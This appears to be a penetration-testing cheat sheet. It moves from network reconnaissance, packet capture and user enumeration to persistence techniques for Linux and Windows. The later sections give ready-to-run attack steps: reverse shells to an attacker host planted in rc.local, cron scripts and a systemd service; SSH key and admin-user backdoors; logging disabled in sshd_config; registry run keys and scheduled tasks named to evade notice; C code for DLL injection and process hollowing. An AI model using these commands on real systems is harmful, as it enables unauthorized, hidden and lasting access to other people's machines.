docs.title: Active Recon
docs.text: Active reconnaissance involves interacting directly with the target to gather information.

docs.title: DNS Brute Forcing
docs.text:
Find subdomains using a wordlist:

dnsrecon -d <target-domain> -D /path/to/wordlist.txt -t brt

docs.title: Port Scanning
docs.text:
Fast TCP scan with live host detection:

nmap -sn -PE -PA21,23,80,3389 <target-subnet>

docs.title: OS Detection
docs.text:
Aggressive OS guessing:

nmap -O --osscan-guess --max-retries 1 <target-ip>

docs.title: SMB Enumeration
docs.text:
List shared folders:

smbclient -L //<target-ip> -N

Enumerate user accounts:

enum4linux -a <target-ip>

docs.title: SMTP User Enumeration
docs.text:
Check for valid user accounts:

nc -nv <target-ip> 25
HELO attacker.com
VRFY admin

docs.title: SNMP Information Gathering
docs.text:
Retrieve system details via SNMP:

snmpwalk -c public -v2c <target-ip>

docs.title: Banner Grabbing
docs.text:
Using Netcat:

nc -nv <target-ip> 80

Using cURL:

curl -I http://<target-ip>

docs.title: Checking for Open Proxies
docs.text:
Identify proxy servers:

proxychains nmap -sT -p 80,443 <target-ip>

docs.title: Brute-Force Subdomain Discovery
docs.text:
Using wfuzz:

wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<target-domain>" http://<target-ip>

docs.title: Traffic Capture
docs.text:
Tip

Always specify an interface explicitly (-i tun0 or -i eth0) — defaulting to any on a busy network produces unmanageable output. Use -w capture.pcap to write to disk and analyze offline with Wireshark or tshark.

docs.title: tcpdump
docs.text: Official Documentation: tcpdump.1 Tutorial & Examples: HackerTarget

docs.title: Basic Capture on a Specific Interface and Port
docs.text: sudo tcpdump -i tun0 port 80

docs.title: Common Options:
docs.text:
• -w capture.pcap → Save output to a file for later analysis.

  • -v → Verbose output.

  • -vv → More verbose output, including ASCII data.

  • icmp → Filter ICMP packets only.

  • -n → Do not resolve IP addresses to hostnames.

docs.title: Capturing GET Requests
docs.text:
sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

  • The above filter captures HTTP GET requests on TCP port 80.

  • -A ensures ASCII text output is shown directly in the terminal.

docs.title: Filtering by TCP Flags
docs.text:
sudo tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'

  • Captures only SYN or FIN packets.

  • Useful for detecting connection attempts and terminations.

docs.title: Capture Only DNS Traffic
docs.text:
sudo tcpdump -i eth0 udp port 53
  • Monitors DNS queries and responses.

docs.title: Capture HTTPS Traffic on a Specific Host
docs.text: sudo tcpdump -i eth0 port 443 and host 192.168.1.10

docs.title: Capture All SSH Traffic
docs.text:
sudo tcpdump -i eth0 port 22
  • Helpful for detecting unauthorized SSH access.

docs.title: Capture Packets from a Specific MAC Address
docs.text: sudo tcpdump -i eth0 ether src 00:1A:2B:3C:4D:5E

docs.title: Save to a File for Offline Analysis
docs.text: sudo tcpdump -i eth0 -w output.pcap

docs.title: Read a Saved Capture File
docs.text: tcpdump -r output.pcap

docs.title: Analyze with Wireshark
docs.text:
tshark -r output.pcap
  • tshark provides command-line packet analysis from Wireshark.

docs.title: User & Host Enumeration
docs.text:
Tip

On Linux, cat /etc/passwd and id tell you who you are and who else exists. On Windows, whoami /priv and net user are the first two commands to run. In AD environments, net user /domain gives domain users without any special tools.

docs.title: local user enumeration on linux
docs.text:
cat /etc/passwd  # List all users
cut -d: -f1 /etc/passwd  # Extract usernames
getent passwd  # Query system user database

Check currently logged-in users:

who
w
users

docs.title: local user enumeration on windows
docs.text:
Check local users:

net user

List logged-in users:

query user

Check if the current user has admin privileges:

whoami /priv

docs.title: active directory user enumeration
docs.text:
List all domain users:

net user /domain
Get-ADUser -Filter *

Query specific user details:

net user <username> /domain
Get-ADUser -Identity <username> -Properties *

List groups a user is a member of:

net user <username> /domain | findstr "Group"

Find users with SPN set (Kerberoastable accounts):

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

docs.title: linux host enumeration
docs.text:
Find system hostname:

hostname
uname -n

List network interfaces:

ip a
ifconfig -a

Find running services:

systemctl list-units --type=service
ps aux

docs.title: windows host enumeration
docs.text:
Find hostname and domain:

hostname
echo %USERDOMAIN%

List installed programs:

wmic product get name,version

List active network connections: ^m1bu5e

netstat -ano
Get-NetTCPConnection

docs.title: smb enumeration
docs.text:
Check for open SMB shares:

smbclient -L //<target-ip> -N

Enumerate SMB shares using Nmap:

nmap --script smb-enum-shares -p445 <target-ip>

docs.title: ldap enumeration
docs.text:
Retrieve domain details via LDAP:

ldapsearch -x -b "dc=example,dc=com"

Find AD users via LDAP:

ldapsearch -x -h <dc-ip> -b "dc=example,dc=com" "(objectClass=person)"

docs.title: Backdoor SSH & WinRM
docs.text:
Tip

For SSH backdoor, add your public key to ~/.ssh/authorized_keys (or /root/.ssh/authorized_keys). No password needed and it survives password changes. For WinRM, enable it with Enable-PSRemoting -Force and add your user to the Remote Management Users group.

docs.title: Adding an Attacker's SSH Key
docs.text:
One of the simplest ways to maintain SSH access is to add an attacker's SSH key to the target's ~/.ssh/authorized_keys file.

echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

This allows the attacker to log in without requiring a password.

docs.title: Creating a Persistent Reverse Shell
docs.text:
To ensure access, a reverse SSH shell can be added to rc.local:

echo "nohup bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 &" >> /etc/rc.local

docs.title: Modifying SSH Configuration
docs.text:
An attacker may configure SSH to allow root login or disable logging:

sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "LogLevel QUIET" >> /etc/ssh/sshd_config
systemctl restart ssh

docs.title: WinRM Backdoor Persistence
docs.text: Windows Remote Management (WinRM) is a powerful way to maintain persistent access to a Windows machine.

docs.title: Enabling WinRM
docs.text:
If disabled, an attacker can enable WinRM with:

winrm quickconfig
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}

docs.title: Creating a Malicious WinRM User
docs.text:
To create a backdoor user with admin privileges:

net user backdoor P@ssw0rd /add
net localgroup Administrators backdoor /add

docs.title: Using Evil-WinRM for Remote Access
docs.text:
Once a foothold is established, the attacker can use Evil-WinRM to maintain access:

evil-winrm -i <target-ip> -u backdoor -p P@ssw0rd

docs.title: Persisting with Scheduled Tasks
docs.text:
A scheduled task can be created to execute a malicious script:

schtasks /create /sc minute /mo 5 /tn "WinRM_Backdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\backdoor.ps1"

docs.title: Creating a Registry-Based Backdoor
docs.text:
By modifying registry settings, WinRM can be configured for persistence:

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinRM_Backdoor" /t REG_SZ /d "powershell -ExecutionPolicy Bypass -File C:\backdoor.ps1" /f

These techniques ensure an attacker maintains access even after a system reboot.

docs.title: DLL Injection & Services
docs.text:
Watch out

Malicious services and DLL injection are heavily signatured by modern EDR. In real engagements, prefer LOLBin-based persistence (scheduled tasks, registry run keys, COM hijacking) over dropping new binaries.

docs.title: Classic DLL Injection
docs.text:
This involves injecting a DLL into a running process using LoadLibrary or CreateRemoteThread.

#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (!hProcess) {
        printf("Failed to open process\n");
        return 1;
    }

    void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pDllPath, argv[2], strlen(argv[2]) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread\n");
        return 1;
    }

    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}

This code injects a specified DLL into a target process by writing the DLL path into the process's memory and executing LoadLibraryA.

docs.title: Reflective DLL Injection
docs.text:
Reflective DLL injection allows loading a DLL directly into memory without writing it to disk. This method avoids detection by antivirus software.

A common tool for reflective DLL injection is mimikatz:

Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcessID 1234

docs.title: Process Hollowing
docs.text:
Process hollowing is a technique where a legitimate process is launched in a suspended state, and its memory is replaced with malicious code.

#include <windows.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    void* pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pRemoteMemory, payload, payloadSize, NULL);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

This creates a suspended svchost.exe process, replaces its memory with a malicious payload, and resumes execution.

docs.title: Malicious Services
docs.text: Windows services provide a powerful way to establish persistence by registering a backdoor service that starts at boot.

docs.title: Creating a Malicious Service
docs.text:
sc create BackdoorService binPath= "C:\Windows\System32\cmd.exe /c C:\payload.exe" start= auto
sc start BackdoorService

This registers a service that executes payload.exe on startup.

docs.title: Modifying an Existing Service
docs.text:
If a writable service is found, its binary path can be modified to execute a backdoor.

sc config VulnerableService binPath= "C:\malicious.exe"
sc start VulnerableService

docs.title: DLL Hijacking
docs.text:
Many Windows services load DLLs from insecure directories. Replacing a DLL with a malicious version can grant execution with elevated privileges.

Steps:

  1. Identify a DLL loaded by a service from an unprotected path:

    listdlls -accepteula | findstr "C:\Program Files\VulnerableApp\"

  2. Replace the DLL with a malicious one:

    move C:\backdoor.dll C:\Program Files\VulnerableApp\legit.dll

docs.title: Scheduled Task Service Execution
docs.text:
A service can be configured to execute a malicious task periodically.

schtasks /create /tn "WinPersistence" /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM

This ensures execution every time a user logs in.

docs.title: References
docs.text:
Stealthy vs quick

Cron (* * * * * /tmp/.x) is quick but obvious in crontab -l. For stealth, add to /etc/cron.d/ with a blending name (logrotate-extra). SSH authorized_keys is most reliable — survives reboots and doesn't show in process listings.

docs.title: Persistence via Cron Jobs
docs.text: Cron jobs execute scheduled commands at specified intervals. If a writable cron job is running as root, it can be modified to maintain persistence.

docs.title: Identifying Writable Cron Jobs
docs.text:
ls -lah /etc/cron*
cat /etc/crontab
crontab -l

Check /var/log/syslog for cron job execution:

grep "CRON" /var/log/syslog

If a writable script is executed as root, modify it to maintain access.

docs.title: Injecting a Reverse Shell into a Cron Job
docs.text:
If a cron job is running an editable script:

echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /home/user/backup.sh

Then start a Netcat listener:

nc -lvnp 4444

When the cron job executes, it provides a reverse shell.

docs.title: Persistence via SSH Keys
docs.text: Adding an SSH key to the authorized_keys file allows persistent access to the system.

docs.title: Creating an SSH Key
docs.text:
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key

Copy the public key to the target:

echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

Now, access the system using:

ssh -i persistent_key user@target

This allows persistent access even if passwords change.

docs.title: Persistence via Systemd Service
docs.text: Systemd allows persistent execution of malicious payloads by creating a service.

docs.title: Creating a Systemd Service
docs.text:
1. Create a service file:

    nano /etc/systemd/system/persistence.service

  2. Add the following:

    [Unit]
Description=Persistence Service
After=multi-user.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

[Install]
WantedBy=multi-user.target

  3. Enable and start the service:

    systemctl enable persistence.service
systemctl start persistence.service

This ensures the payload runs on every system reboot.

docs.title: Registry & Scheduled Tasks
docs.text:
Tip

Scheduled tasks with SYSTEM privileges are powerful but logged. Use schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c ..." /sc onlogon /ru SYSTEM and name the task to blend in with legitimate tasks.

docs.title: Common Persistence Keys
docs.text:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
